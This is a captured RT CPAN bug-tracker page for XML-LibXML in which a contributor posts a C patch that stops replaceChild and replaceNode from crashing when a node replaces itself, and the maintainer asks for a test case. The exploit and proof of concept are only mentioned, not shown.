+-                    warn&#40;&#34;replaceChild with a document fragment node on a document node not supported yet!&#34;&#41;;
+-                    XSRETURN_UNDEF;
+-                    break;
+-                case XML_TEXT_NODE:
+-                case XML_CDATA_SECTION_NODE:
+-                    warn&#40;&#34;replaceChild with a text node not supported on a document node!&#34;&#41;;
+-                    XSRETURN_UNDEF;
+-                    break;
+-                default:
+-                    break;
+-                }
+-        }
+-        ret = domReplaceChild&#40; self, nNode, oNode &#41;;
+-        if &#40;ret == NULL&#41; {
+-            XSRETURN_UNDEF;
+-        }
+-        else {
+-            LibXML_reparent_removed_node&#40;ret&#41;;
+-            RETVAL = PmmNodeToSv&#40;ret, PmmOWNERPO&#40;PmmPROXYNODE&#40;ret&#41;&#41;&#41;;
+-            if &#40;nNode-&gt;type == XML_DTD_NODE&#41; {
+-                LibXML_set_int_subset&#40;nNode-&gt;doc, nNode&#41;;
++       if&#40; nNode == oNode &#41; {
++           RETVAL = nNode;
++       }else{
++           if &#40; self-&gt;type == XML_DOCUMENT_NODE &#41; {
++                    switch &#40; nNode-&gt;type &#41; {
++                    case XML_ELEMENT_NODE:
++                        warn&#40;&#34;replaceChild with an element on a document node not supported yet!&#34;&#41;;
++                        XSRETURN_UNDEF;
++                        break;
++                    case XML_DOCUMENT_FRAG_NODE:
++                        warn&#40;&#34;replaceChild with a document fragment node on a document node not supported yet!&#34;&#41;;
++                        XSRETURN_UNDEF;
++                        break;
++                    case XML_TEXT_NODE:
++                    case XML_CDATA_SECTION_NODE:
++                        warn&#40;&#34;replaceChild with a text node not supported on a document node!&#34;&#41;;
++                        XSRETURN_UNDEF;
++                        break;
++                    default:
++                        break;
++                    }
+             }
+-            if &#40; nNode-&gt;_private != NULL &#41; {
+-                PmmFixOwner&#40; PmmPROXYNODE&#40;nNode&#41;,
+-                             PmmOWNERPO&#40;PmmPROXYNODE&#40;self&#41;&#41; &#41;;
++            ret = domReplaceChild&#40; self, nNode, oNode &#41;;
++            if &#40;ret == NULL&#41; {
++                XSRETURN_UNDEF;
++            }
++            else {
++                LibXML_reparent_removed_node&#40;ret&#41;;
++                RETVAL = PmmNodeToSv&#40;ret, PmmOWNERPO&#40;PmmPROXYNODE&#40;ret&#41;&#41;&#41;;
++                if &#40;nNode-&gt;type == XML_DTD_NODE&#41; {
++                    LibXML_set_int_subset&#40;nNode-&gt;doc, nNode&#41;;
++                }
++                if &#40; nNode-&gt;_private != NULL &#41; {
++                    PmmFixOwner&#40; PmmPROXYNODE&#40;nNode&#41;,
++                                 PmmOWNERPO&#40;PmmPROXYNODE&#40;self&#41;&#41; &#41;;
++                }
+             }
+         }
+     OUTPUT:
+</div></div>
+</div>
+    </div>
+</div>
+</div>
+<div class="ticket-transaction message Correspond even">
+<div class="ticket-transaction">
+  <div class="metadata">
+    <span class="type">
+      <a name="txn-1741171" href="/Public/Bug/Display.html?id=122246#txn-1741171">#</a>      
+    </span>
+    <span class="date">Wed&nbsp;Jul&nbsp;26&nbsp;09:20:16&nbsp;2017</span>
+    <span class="description">TLU [...] cpan.org -  Correspondence added</span>
+    <span class="time-taken"></span>    <span class="actions hidden"></span>
+  </div>
+    <div class="content">
+      
+<div class="messageattachments">
+<div class="downloadattachment">
+<a href="/Ticket/Attachment/1741171/936534/">Download &#40;untitled&#41;</a> / <a href="/Ticket/Attachment/WithHeaders/936534">with headers</a>
+<br />
+<span class="downloadcontenttype">text/plain 456b</span>
+</div>
+<div class="messagebody">
+<div class="message-stanza plain-text-white-space">On Thu Jul 13 08:09:08 2017, TLU wrote:
+
+<span
+    class="message-stanza-folder closed"
+    onclick="fold_message_stanza(this, 'Show\x20quoted\x20text', 'Hide\x20quoted\x20text');">Show quoted text</span><br /><div class="message-stanza closed">&gt; I made a little patch which keeps the PoC from crashing and which I&#39;ll
+&gt; attach here. Feel free to tell me what I didn&#39;t think of :-&#41;
+</div>
+I think I found another way to trigger the problem. There&#39;s this replaceNode&#40;&#41; function, which goes through the same motions as replaceChild&#40;&#41; when asked to replace a node by itself.
+
+Attached is a new patch which does the same trivial check for replaceNode&#40;&#41;.
+
+Regards,
+Torsten
+</div></div>
+<table>
+  <tr>
+    <td align="right" class="message-header-key">Subject:</td>
+    <td class="message-header-value"> XML-LibXML-2.0129.patch</td>
+  </tr>
+</table>
+<div class="downloadattachment">
+<a href="/Ticket/Attachment/1741171/936535/XML-LibXML-2.0129.patch">Download XML-LibXML-2.0129.patch</a><br />
+<span class="downloadcontenttype">text/x-diff 5k</span>
+</div>
+<div class="messagebody">
+<div class="message-stanza plain-text-white-space">diff -urN XML-LibXML-2.0129.orig/LibXML.xs XML-LibXML-2.0129/LibXML.xs
+--- XML-LibXML-2.0129.orig/LibXML.xs	2016-06-24 18:01:53.000000000 +0200
++++ XML-LibXML-2.0129/LibXML.xs	2017-07-26 15:11:12.030895877 +0200
+@@ -4829,38 +4829,42 @@
+     PREINIT:
+         xmlNodePtr ret = NULL;
+     CODE:
+-       if &#40; self-&gt;type == XML_DOCUMENT_NODE &#41; {
++        if&#40; nNode == oNode &#41; {
++            RETVAL = nNode;
++        }else{
++            if &#40; self-&gt;type == XML_DOCUMENT_NODE &#41; {
+                 switch &#40; nNode-&gt;type &#41; {
+-                case XML_ELEMENT_NODE:
+-                    warn&#40;&#34;replaceChild with an element on a document node not supported yet!&#34;&#41;;
+-                    XSRETURN_UNDEF;
+-                    break;
+-                case XML_DOCUMENT_FRAG_NODE:
+-                    warn&#40;&#34;replaceChild with a document fragment node on a document node not supported yet!&#34;&#41;;
+-                    XSRETURN_UNDEF;
+-                    break;
+-                case XML_TEXT_NODE:
+-                case XML_CDATA_SECTION_NODE:
+-                    warn&#40;&#34;replaceChild with a text node not supported on a document node!&#34;&#41;;
+-                    XSRETURN_UNDEF;
+-                    break;
+-                default:
+-                    break;
++                    case XML_ELEMENT_NODE:
++                        warn&#40;&#34;replaceChild with an element on a document node not supported yet!&#34;&#41;;
++                        XSRETURN_UNDEF;
++                        break;
++                    case XML_DOCUMENT_FRAG_NODE:
++                        warn&#40;&#34;replaceChild with a document fragment node on a document node not supported yet!&#34;&#41;;
++                        XSRETURN_UNDEF;
++                        break;
++                    case XML_TEXT_NODE:
++                    case XML_CDATA_SECTION_NODE:
++                        warn&#40;&#34;replaceChild with a text node not supported on a document node!&#34;&#41;;
++                        XSRETURN_UNDEF;
++                        break;
++                    default:
++                        break;
++                }
++            }
++            ret = domReplaceChild&#40; self, nNode, oNode &#41;;
++            if &#40;ret == NULL&#41; {
++                XSRETURN_UNDEF;
++            }
++            else {
++                LibXML_reparent_removed_node&#40;ret&#41;;
++                RETVAL = PmmNodeToSv&#40;ret, PmmOWNERPO&#40;PmmPROXYNODE&#40;ret&#41;&#41;&#41;;
++                if &#40;nNode-&gt;type == XML_DTD_NODE&#41; {
++                    LibXML_set_int_subset&#40;nNode-&gt;doc, nNode&#41;;
++                }
++                if &#40; nNode-&gt;_private != NULL &#41; {
++                    PmmFixOwner&#40; PmmPROXYNODE&#40;nNode&#41;,
++                                 PmmOWNERPO&#40;PmmPROXYNODE&#40;self&#41;&#41; &#41;;
+                 }
+-        }
+-        ret = domReplaceChild&#40; self, nNode, oNode &#41;;
+-        if &#40;ret == NULL&#41; {
+-            XSRETURN_UNDEF;
+-        }
+-        else {
+-            LibXML_reparent_removed_node&#40;ret&#41;;
+-            RETVAL = PmmNodeToSv&#40;ret, PmmOWNERPO&#40;PmmPROXYNODE&#40;ret&#41;&#41;&#41;;
+-            if &#40;nNode-&gt;type == XML_DTD_NODE&#41; {
+-                LibXML_set_int_subset&#40;nNode-&gt;doc, nNode&#41;;
+-            }
+-            if &#40; nNode-&gt;_private != NULL &#41; {
+-                PmmFixOwner&#40; PmmPROXYNODE&#40;nNode&#41;,
+-                             PmmOWNERPO&#40;PmmPROXYNODE&#40;self&#41;&#41; &#41;;
+             }
+         }
+     OUTPUT:
+@@ -4874,30 +4878,34 @@
+         xmlNodePtr ret = NULL;
+         ProxyNodePtr owner = NULL;
+     CODE:
+-        if &#40; domIsParent&#40; self, nNode &#41; == 1 &#41; {
+-            XSRETURN_UNDEF;
+-        }
+-        owner = PmmOWNERPO&#40;PmmPROXYNODE&#40;self&#41;&#41;;
++        if&#40; self == nNode &#41; {
++            RETVAL = nNode;
++        }else{
++            if &#40; domIsParent&#40; self, nNode &#41; == 1 &#41; {
++                XSRETURN_UNDEF;
++            }
++            owner = PmmOWNERPO&#40;PmmPROXYNODE&#40;self&#41;&#41;;
+ 
+-        if &#40; self-&gt;type != XML_ATTRIBUTE_NODE &#41; {
+-              ret = domReplaceChild&#40; self-&gt;parent, nNode, self&#41;;
+-        }
+-        else {
+-             ret = xmlReplaceNode&#40; self, nNode &#41;;
+-        }
+-        if &#40; ret &#41; {
+-            LibXML_reparent_removed_node&#40;ret&#41;;
+-            RETVAL = PmmNodeToSv&#40;ret, PmmOWNERPO&#40;PmmPROXYNODE&#40;ret&#41;&#41;&#41;;
+-            if &#40;nNode-&gt;type == XML_DTD_NODE&#41; {
+-                LibXML_set_int_subset&#40;nNode-&gt;doc, nNode&#41;;
++            if &#40; self-&gt;type != XML_ATTRIBUTE_NODE &#41; {
++                ret = domReplaceChild&#40; self-&gt;parent, nNode, self&#41;;
+             }
+-            if &#40; nNode-&gt;_private != NULL &#41; {
+-                PmmFixOwner&#40;PmmPROXYNODE&#40;nNode&#41;, owner&#41;;
++            else {
++                ret = xmlReplaceNode&#40; self, nNode &#41;;
++            }
++            if &#40; ret &#41; {
++                LibXML_reparent_removed_node&#40;ret&#41;;
++                RETVAL = PmmNodeToSv&#40;ret, PmmOWNERPO&#40;PmmPROXYNODE&#40;ret&#41;&#41;&#41;;
++                if &#40;nNode-&gt;type == XML_DTD_NODE&#41; {
++                    LibXML_set_int_subset&#40;nNode-&gt;doc, nNode&#41;;
++                }
++                if &#40; nNode-&gt;_private != NULL &#41; {
++                    PmmFixOwner&#40;PmmPROXYNODE&#40;nNode&#41;, owner&#41;;
++                }
++            }
++            else {
++                croak&#40; &#34;replacement failed&#34; &#41;;
++                XSRETURN_UNDEF;
+             }
+-        }
+-        else {
+-            croak&#40; &#34;replacement failed&#34; &#41;;
+-            XSRETURN_UNDEF;
+         }
+     OUTPUT:
+         RETVAL
+</div></div>
+</div>
+    </div>
+</div>
+</div>
+<div class="ticket-transaction message Correspond odd">
+<div class="ticket-transaction">
+  <div class="metadata">
+    <span class="type">
+      <a name="txn-1741884" href="/Public/Bug/Display.html?id=122246#txn-1741884">#</a>      
+    </span>
+    <span class="date">Sun&nbsp;Jul&nbsp;30&nbsp;04:40:32&nbsp;2017</span>
+    <span class="description">SHLOMIF [...] cpan.org -  Correspondence added</span>
+    <span class="time-taken"></span>    <span class="actions hidden"></span>
+  </div>
+    <div class="content">
+      
+<div class="downloadattachment">
+<a href="/Ticket/Attachment/1741884/936936/">Download &#40;untitled&#41;</a> / <a href="/Ticket/Attachment/WithHeaders/936936">with headers</a>
+<br />
+<span class="downloadcontenttype">text/plain 749b</span>
+</div>
+<div class="messagebody">
+<div class="message-stanza plain-text-white-space">On Wed Jul 26 09:20:16 2017, TLU wrote:
+<span
+    class="message-stanza-folder closed"
+    onclick="fold_message_stanza(this, 'Show\x20quoted\x20text', 'Hide\x20quoted\x20text');">Show quoted text</span><br /><div class="message-stanza closed">&gt; On Thu Jul 13 08:09:08 2017, TLU wrote:
+&gt; 
+<div class="message-stanza open">&gt; &gt; I made a little patch which keeps the PoC from crashing and which
+&gt; &gt; I&#39;ll
+&gt; &gt; attach here. Feel free to tell me what I didn&#39;t think of :-&#41;
+</div>&gt; 
+&gt; I think I found another way to trigger the problem. There&#39;s this
+&gt; replaceNode&#40;&#41; function, which goes through the same motions as
+&gt; replaceChild&#40;&#41; when asked to replace a node by itself.
+&gt; 
+&gt; Attached is a new patch which does the same trivial check for
+&gt; replaceNode&#40;&#41;.
+&gt; 
+&gt; Regards,
+&gt; Torsten
+</div>
+Hi Torsten!
+
+Sorry for the late reply. Thanks for the patch, but please note that it should include a new test case &#40;see t/*.t&#41;. Can you resubmit it with it inside? Also see <span class="clickylink"><a target="new" rel="nofollow" href="https://github.com/shlomif/perl-XML-LibXML/">https://github.com/shlomif/perl-XML-LibXML/</a></span> .
+</div></div>
+    </div>
+</div>
+</div>
+<div class="ticket-transaction message Correspond even">
+<div class="ticket-transaction">
+  <div class="metadata">
+    <span class="type">
+      <a name="txn-1742074" href="/Public/Bug/Display.html?id=122246#txn-1742074">#</a>      
+    </span>
+    <span class="date">Mon&nbsp;Jul&nbsp;31&nbsp;09:47:58&nbsp;2017</span>
+    <span class="description">TLU [...] cpan.org -  Correspondence added</span>
+    <span class="time-taken"></span>    <span class="actions hidden"></span>
+  </div>
+    <div class="content">
+      
+<div class="downloadattachment">
+<a href="/Ticket/Attachment/1742074/937051/">Download &#40;untitled&#41;</a> / <a href="/Ticket/Attachment/WithHeaders/937051">with headers</a>
+<br />
+<span class="downloadcontenttype">text/plain 472b</span>
+</div>
+<div class="messagebody">
+<div class="message-stanza plain-text-white-space">On Sun Jul 30 04:40:32 2017, SHLOMIF wrote:
+
+[...] 
+<span
+    class="message-stanza-folder closed"
+    onclick="fold_message_stanza(this, 'Show\x20quoted\x20text', 'Hide\x20quoted\x20text');">Show quoted text</span><br /><div class="message-stanza closed">&gt; Sorry for the late reply. Thanks for the patch, but please note that
+&gt; it should include a new test case &#40;see t/*.t&#41;. Can you resubmit it
+&gt; with it inside? Also see <span class="clickylink"><a target="new" rel="nofollow" href="https://github.com/shlomif/perl-XML-LibXML/">https://github.com/shlomif/perl-XML-LibXML/</a></span> .
+</div>
+Hello,
+
+I added a test - just the exploit of tadinhsung, really - and created a pull request. I hope it worked, AppVeyor seems to choke on it because there&#39;s something with StrawberryPerl.
+
+Regards,
+Torsten
+</div></div>
+    </div>
+</div>
+</div>
+</div>
+    <hr class="clear" />
+  </div>
+</div>
+
+
+
+
+</div>
+ 
+
+
+  <hr class="clear" />
+</div>
+<p id="sponsors">
+  This service is sponsored and maintained by
+  <a href="http://bestpractical.com">Best Practical Solutions</a> and runs on
+  <a href="http://noc.perl.org">Perl.org</a> infrastructure.
+</p>
+
+<p id="contact-info">
+  Please report any issues with rt.cpan.org to <a href="mailto:rt-cpan-admin@bestpractical.com">rt-cpan-admin@bestpractical.com</a>.
+</p>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA\x2D937849\x2D12');
+  ga('send', 'pageview');
+</script>
+
+<div id="footer">
+  <p id="time"><span>Time to display: 0.491814</span></p>
+  <p id="bpscredits"><span>&#187;&#124;&#171; RT 4.0.18 Copyright 1996-2013 <a href="http://www.bestpractical.com?rt=4.0.18">Best Practical Solutions, LLC</a>.
+</span></p>
+</div>
+  </body>
+</html>
